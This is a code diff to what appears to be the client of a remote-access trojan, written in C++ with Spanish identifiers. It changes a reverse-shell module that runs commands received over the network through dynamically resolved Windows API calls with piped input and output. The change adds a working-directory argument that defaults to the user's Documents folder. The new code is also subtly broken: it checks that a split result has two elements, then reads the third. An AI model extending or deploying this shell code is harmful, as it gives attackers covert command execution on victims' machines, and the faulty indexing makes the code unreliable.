@@ -824,8 +824,11 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             delete this->reverseSHELL;
             this->reverseSHELL = nullptr;
         }
+
+        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 2);
+
         this->reverseSHELL = new ReverseShell();
-        this->reverseSHELL->SpawnShell(paquete.cBuffer.data());
+        this->reverseSHELL->SpawnShell(strIn[0].c_str(), strIn.size() == 2 ? strIn[2].c_str() : NULL);
         return;
     }
 
@@ -1815,13 +1818,20 @@ std::string Cliente::ObtenerDocs() {
 
 
 //Reverse shell
+
 #ifdef __MOD_SHELL
-bool ReverseShell::SpawnShell(const char* pstrComando) {
+bool ReverseShell::SpawnShell(const char* pstrComando, const char* cPath) {
     if (!cCliente->mod_dynamic->KERNEL32.pGetStartupInfoA || !cCliente->mod_dynamic->KERNEL32.pCreateProcessA || !cCliente->mod_dynamic->KERNEL32.pCreatePipe) {
         __DBG_("[X]SpawnShell no se cargaron las funciones");
         return false;
     }
     __DBG_("Lanzando " + std::string(pstrComando));
+
+    std::string strExecPath = cPath;
+
+    if (strExecPath.size() == 0) {
+        strExecPath = cCliente->ObtenerDocs();
+    }
 
     this->stdinRd = this->stdinWr = this->stdoutRd = this->stdoutWr = nullptr;
     SECURITY_ATTRIBUTES sa;
@@ -1846,7 +1856,7 @@ bool ReverseShell::SpawnShell(const char* pstrComando) {
         si.hStdError = this->stdoutWr;
         si.hStdInput = this->stdinRd;
 
-        if (cCliente->mod_dynamic->KERNEL32.pCreateProcessA(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
+        if (cCliente->mod_dynamic->KERNEL32.pCreateProcessA(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, (LPCSTR)strExecPath.c_str(), &si, &this->pi) == 0) {
             DWORD err = 0;
             if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
                 err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
